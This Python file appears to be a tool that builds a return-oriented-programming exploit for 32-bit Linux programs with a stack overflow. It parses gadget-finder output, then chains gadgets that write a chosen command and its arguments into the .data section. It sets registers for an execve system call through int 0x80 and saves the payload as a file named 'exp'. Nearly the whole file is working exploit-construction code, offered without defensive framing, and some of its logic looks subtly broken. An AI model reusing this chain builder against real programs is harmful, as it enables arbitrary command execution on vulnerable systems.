import io
import re
import math
from struct import pack

# Look for add eax, <reg>
#        + mov <stack> eax gadgets for allowing zero bytes in target addresses

# Challenge, find a way to offset stack reg value to allow for zero bytes in addresses. Large chain of 'inc'/'dec' instructions may overflow stack

# 0x080540be : sub edx, edi ; mov eax, edx ; pop edi ; pop ebp ; ret


class ParseChain():
    def __init__(self) -> None:
        self.DST_REG = 'edx'
        self.SRC_REG = 'eax'
        self.PDST = ''
        self.PSRC = ''
        self.PEAX = ''
        self.PEBX = ''
        self.PECX = ''
        self.PEDX = ''
        self.POP_EAX = None
        self.POP_EBX = None
        self.POP_ECX = None
        self.POP_EDX = None
        self.PUSH_EAX = None
        self.SUB_EAX = None
        self.SEAX = ''
        self.PUSH_ESI = None
        self.POP_ESI = None
        pass

    def parse_gadget(self, gadget):
        regex = re.search(": push eax ; ret", gadget)
        if regex and not self.PUSH_EAX:
            self.PUSH_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        regex = re.search(": sub eax, (?P<src>([(ebx)|(ecx)|(edx)]{3})) ; ret", gadget)
        if regex and not self.SUB_EAX:
            self.SUB_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            self.SEAX = gadget.split(',')[1].split(';')[0].strip()
            return True
        regex = re.search(": push esi ; ret", gadget)
        if regex and not self.PUSH_ESI:
            self.PUSH_ESI = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        regex = re.search(": pop esi ; ret", gadget)
        if regex and not self.POP_ESI:
            self.POP_ESI = pack('<I', int(gadget.split(' ')[0], 16))
            return True

        return False


    def parse_chain_gadget(self, gadget):
        print(gadget)
        regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})) ; ret", gadget)
        if regex:
            self.DST_REG = gadget.split('[')[1].split(']')[0]
            self.SRC_REG = gadget.split(',')[1].split(';')[0].strip()
            self.MOVSTACK = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('pop ' + self.DST_REG, gadget)
        if regex and self.DST_REG not in ['eax', 'ebx', 'ecx', 'edx']:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ' + self.DST_REG:
                    self.POP_DST_REG = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PDST += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PDST += 'A'
                elif ins == 'ret': return True
            return False
        
        regex = re.search('pop ' + self.SRC_REG, gadget)
        if regex and self.SRC_REG not in ['eax', 'ebx', 'ecx', 'edx']:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ' + self.SRC_REG:
                    self.POP_SRC_REG = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PSRC += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PSRC += 'A'
                elif ins == 'ret': return True
            return False
        
        regex = re.search('xor ' + self.SRC_REG + ", " + self.SRC_REG + ' ; ret', gadget)
        if regex and self.SRC_REG != 'eax':
            self.XOR_SRC = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('xor eax, eax ; ret', gadget)
        if regex:
            self.XOR_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            if self.SRC_REG == 'eax': self.XOR_SRC = self.XOR_EAX
            return True
        
        regex = re.search('inc eax ; ret', gadget)
        if regex:
            self.INC_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('pop eax', gadget)
        if regex and not self.POP_EAX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop eax':
                    self.POP_EAX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PEAX += 'A'
                elif ins.split(' ')[0] == 'pop':
                    self.PEAX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'eax':
                        self.POP_DST_REG = self.POP_EAX
                        self.PDST = self.PEAX
                    elif self.SRC_REG == 'eax':
                        self.POP_SRC_REG = self.POP_EAX
                        self.PSRC = self.PEAX
                    return True
            return False
        
        regex = re.search('pop ebx', gadget)
        if regex and not self.POP_EBX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ebx':
                    self.POP_EBX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PEBX += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PEBX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'ebx':
                        self.POP_DST_REG = self.POP_EBX
                        self.PDST = self.PEBX
                    elif self.SRC_REG == 'ebx':
                        self.POP_SRC_REG = self.POP_EBX
                        self.PSRC = self.PEBX
                    return True
            return False
        
        regex = re.search('pop ecx', gadget)
        if regex and not self.POP_ECX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ecx':
                    self.POP_ECX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PECX += 'C'
                elif ins.split(' ')[0] == 'pop':
                    self.PECX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'ecx':
                        self.POP_DST_REG = self.POP_ECX
                        self.PDST = self.PECX
                    elif self.SRC_REG == 'ecx':
                        self.POP_SRC_REG = self.POP_ECX
                        self.PSRC = self.PECX
                    return True
            return False
        
        regex = re.search('pop edx', gadget)
        if regex and not self.POP_EDX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop edx':
                    self.POP_EDX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PEDX += 'D'
                elif ins.split(' ')[0] == 'pop':
                    self.PEDX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'edx':
                        self.POP_DST_REG = self.POP_EDX
                        self.PDST = self.PEDX
                    elif self.SRC_REG == 'edx':
                        self.POP_SRC_REG = self.POP_EDX
                        self.PSRC = self.PEDX
                    return True
            return False

        regex = re.search('int 0x80', gadget)
        if regex:
            self.INT_80 = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
    def parse_data_loc(self, data_loc):
        self.DATA = int(data_loc, 16)


    def clean_data(self, data):
        offset = 0
        for i in range(0, 4):
            if data & (0xFF * 16 ** (2*i)) == 0xFF * 16 ** (2*i):
                offset += 0x22 * 16 ** (2*i)
            else:
                offset += 0x11 * 16 ** (2*i)

        p = self.POP_EAX
        for r in self.PEAX:
            if r == 'A': p += pack('<I', data + offset)
            else: p += pack('<I', 0x41414141)

        POP_REG = self.POP_EBX
        POP_P = self.PEBX
        POP_PL = 'B'
        if self.SEAX == 'ebx':
            POP_REG = self.POP_EBX
            POP_P = self.PEBX
            POP_PL = 'B'
        elif self.SEAX == 'ecx':
            POP_REG = self.POP_ECX
            POP_P = self.PECX
            POP_PL = 'C'
        elif self.SEAX == 'edx':
            POP_REG = self.POP_EDX
            POP_P = self.PEDX
            POP_PL = 'D'

        p += POP_REG
        for r in POP_P:
            if r == 'A': p += pack('<I', data + offset)
            elif r == POP_PL: p += pack('<I', offset)
            else: p += pack('<I', 0x41414141)

        p += self.SUB_EAX
        return p

    def pad_pop_dst(self, data):
        p = self.clean_data(data)
        p += self.POP_ESI
        p += self.POP_DST_REG
        p += self.PUSH_EAX
        p += self.PUSH_ESI

        reg_id = 'B'
        if self.DST_REG in ['eax', 'ebx', 'ecx', 'edx']: reg_id = self.DST_REG[1:2].upper()
        for r in self.PDST:
            p += self.PUSH_EAX
        return p
    
    def pad_pop_src(self, data, clean=True):
        p = self.POP_SRC_REG
        reg_id = 'B'
        if self.SRC_REG in ['eax', 'ebx', 'ecx', 'edx']: reg_id = self.SRC_REG[1:2].upper()
        for r in self.PSRC:
            if r == reg_id: p += self.clean_data(data) if clean else data
            else: p += pack('<I', 0x41414141)
        return p



    def build_stack_str(self, p, s, offset):
        bound = math.ceil(len(s) / 4)
        for i in range(0, bound):
            p += self.pad_pop_dst(self.DATA + offset + i*4)
            d = str.encode(s[i*4:i*4+4]) if i*4+4 <= len(s) else str.encode(s[i*4:len(s)]) + b'A' * (bound*4 - len(s))
            p += self.pad_pop_src(d, False)
            p += self.MOVSTACK
        
        p += self.pad_pop_dst(self.DATA + offset + len(s))
        p += self.XOR_SRC
        p += self.MOVSTACK

        return p
    
    def make_chain(self, cmd='', args=[]):
        p = b'A'*40
        p += b'B'*4

        offset = 0
        shadow_offset = 100

        p = self.build_stack_str(p, cmd, offset)

        p += self.pad_pop_dst(self.DATA + shadow_offset)
        p += self.pad_pop_src(self.DATA + offset)
        p += self.MOVSTACK

        shadow_offset += 4

        offset += len(cmd) + 1
        for arg in args:
            p = self.build_stack_str(p, arg, offset)

            p += self.pad_pop_dst(self.DATA + shadow_offset)
            p += self.pad_pop_src(self.DATA + offset)
            p += self.MOVSTACK

            shadow_offset += 4
            offset += len(arg) + 1

        p += self.pad_pop_dst(self.DATA + shadow_offset)
        p += self.XOR_SRC
        p += self.MOVSTACK

        p += self.POP_EBX
        print(self.PEBX)
        for r in self.PEBX:
            if r == 'B': self.clean_data(self.DATA)
            else: p += pack('<I', 0x41414141)

        p += self.POP_ECX
        print(self.PECX)
        for r in self.PECX:
            if r == 'B': p += self.clean_data(self.DATA)
            elif r == 'C': p += self.clean_data(self.DATA + 100)
            else: p += pack('<I', 0x41414141)

        p += self.POP_EDX
        print(self.PEDX)
        for r in self.PEDX:
            if r == 'B': p += self.clean_data(self.DATA)
            elif r == 'C': p += self.clean_data(self.DATA + 100)
            elif r == 'D': p += self.clean_data(self.DATA + shadow_offset)
            else: p += pack('<I', 0x41414141)

        p += self.XOR_EAX
        for _ in range(0, 11): p += self.INC_EAX
        p += self.INT_80

        return p


    def write_chain(self, chain):
        out_file = open('exp', 'wb')
        out_file.write(chain)


    def start(self, stdout, cmd, args):
        for line in stdout:
            result = self.parse_gadget(line)
            if result: print(line)
            regex = re.search("Gadget found", line)
            if regex: self.parse_chain_gadget(line.split(":")[1][1:])
            regex = re.search("# @ .data\n", line)
            if regex: self.parse_data_loc(line.split(",")[1][1:11])
        
        chain = self.make_chain(cmd, args)
        self.write_chain(chain)
